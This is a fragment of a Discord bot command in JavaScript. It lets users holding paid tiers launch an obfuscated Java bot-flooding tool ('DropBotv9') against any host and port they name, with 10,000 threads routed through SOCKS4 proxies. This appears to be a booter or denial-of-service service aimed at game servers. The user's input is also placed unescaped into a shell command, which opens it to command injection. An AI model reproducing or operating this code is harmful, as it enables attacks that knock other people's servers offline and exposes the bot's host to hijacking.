...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    .setAuthor(`${message.author.tag}`, message.author.displayAvatarURL({ size: 1024, dynamic: true }))
    .setColor("RED")
    .setDescription(`You don't have permissions, you must have role: <@&${normal}>`)
  
    if(!message.member.roles.cache.has(elite, premium, normal)) {
    ...
    exec(`screen timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=socks4_proxies.txt threads=10000 method=antibotdeluxe version=47 license=123ascqweq11`, (error, stdout, stderr) => {
    });
